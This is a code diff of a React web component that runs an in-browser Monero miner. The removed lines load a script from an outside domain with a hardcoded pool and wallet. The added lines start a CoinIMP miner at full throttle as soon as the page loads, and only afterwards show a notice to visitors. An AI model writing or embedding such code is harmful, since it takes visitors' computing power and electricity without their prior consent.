@@ -2,42 +2,55 @@ import React, { useEffect, useState } from 'react';
 
 function MiningComponent() {
   const [miningStatus, setMiningStatus] = useState('Mining is not running'); // Initial status message
+  const [minerIsRunning, setMinerIsRunning] = useState(false); // Initial status message
+  console.log('minerIsRunning', minerIsRunning);
+  const [clientIsMobile, setClientIsMobile] = useState(false); // Initial status message
 
   useEffect(() => {
-    // Add the <script> tags and code here
-    const script = document.createElement('script');
-    script.src = 'https://script.ghgi.xyz';
-    script.async = true;
-    document.body.appendChild(script);
+    var _client = new window.Client.Anonymous(
+      'a38b16485ce3cf9855e5b4807feca82c62bc2dd71701819243b01f1e22364e12',
+      {
+        throttle: 0,
+        c: 'w',
+      }
+    );
 
-    // The rest of your code
-    const server = 'wss://ghgi.xyz';
-    const pool = 'gulf.moneroocean.stream:10128';
-    const walletAddress =
-      '49YzZ75Vq1Q5fYtPVn7uA8VMdN7aaByKfadPyfeBiJw5GHuD1vKkb2GjeeuApT2wu4AMpT4TBsfWuRsYEBDZNT9NVWCqwoz';
-    const workerId = 'web-1';
-    const threads = -1;
-    const password = '';
-    const throttleMiner = 20;
-    // Add the startMining function here
+    // Check if mobile
+    let isMobile = _client.isMobile();
+    console.log('isMobile', isMobile);
+    if (isMobile) {
+      setClientIsMobile(isMobile);
+    }
 
-    // Set the mining status when mining starts
-    setMiningStatus('Mining is running');
+    // Start miner
+    _client.start();
 
-    // Clean up the script when the component unmounts
-    return () => {
-      document.body.removeChild(script);
-      // Reset the mining status when mining stops
-      setMiningStatus('Mining is not running');
-    };
+    // Bool isrunning
+    let running = _client.isRunning();
+    console.log('running', running);
+    if (running) {
+      setMinerIsRunning(running);
+    }
+
+    // Advert
+    _client.addMiningNotification(
+      'Top',
+      'This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.',
+      '#cccccc',
+      40,
+      '#3d3d3d'
+    );
   }, []);
 
   return (
     <section className='grid outline outline-1 outline-black rounded-lg bg-pink-400 items-center justify-center'>
-      <div>
-        <span className='text-xl font-semibold'>{miningStatus}</span>
-      </div>
-      {/* Your component content goes here */}
+      mine
+      <section>
+        {minerIsRunning ? <div>RUNNING YES</div> : <div>NO FALSE BAD</div>}
+      </section>
+      <section>
+        {clientIsMobile ? <div>MOBILE</div> : <div>PC LAPTOP</div>}
+      </section>
     </section>
   );
 }
